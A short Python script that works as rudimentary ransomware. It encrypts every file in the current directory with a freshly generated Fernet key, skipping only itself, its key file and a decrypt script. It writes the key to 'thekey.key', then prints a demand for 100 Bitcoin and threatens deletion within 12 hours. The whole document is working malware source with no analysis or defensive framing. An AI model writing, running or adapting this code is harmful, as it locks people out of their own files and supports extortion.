#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#find all files

files= []

for file in os.listdir():
	if file == "malwr.py" or file == "thekey.key" or file =="decrypt.py":

		continue
	if os.path.isfile(file):
			files.append(file)

print(files)


key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file , "wb") as thefile:
		thefile.write(contents_encrypted)

print("All of yor files encrypted. Send me 100 Bitcoin or I will delete them in 12 Hours")

